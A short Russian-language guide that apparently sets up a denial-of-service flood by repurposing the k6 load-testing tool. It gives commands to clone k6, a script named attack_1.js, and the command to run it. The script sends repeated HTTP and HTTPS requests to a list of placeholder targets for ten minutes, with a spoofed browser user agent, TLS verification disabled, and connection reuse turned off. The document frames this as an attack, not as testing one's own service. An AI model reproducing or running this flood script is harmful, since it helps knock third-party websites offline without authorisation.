```
git clone https://github.com/grafana/k6.git
cd k6
```

создайте новый файл ./samples/attack_1.js

вставьте этот листинг

```
import { check } from 'k6';
import http from 'k6/http';

export let options = {
  insecureSkipTLSVerify: true,
  noConnectionReuse: true,
  userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0',
  vus: 10, // target
  duration: '10m',
  dns: {
    'ttl': '0s',
    'select': 'roundRobin',
    'policy': 'onlyIPv4',
  },
}

export default function() {
  let targets = {
    '<url>': '<ip>'
  }
  let reqs = []

  for (let k in targets) {
    reqs.push(
      {
        'method': 'GET',
        'url': `https://${targets[k]}`,
        'params': {
          'headers': {
            'Host': `${k}`,
            'referrer': "",
          }
        }
      }
    )
    reqs.push(
      {
        'method': 'GET',
        'url': `http://${targets[k]}`,
        'params': {
          'headers': { 'Host': `${k}`,
          'referrer': "",
          }
        }
      }
    )
  }
  http.batch(reqs);
};
```

запустите

```
k6 run ./samples/attack_1.js
```
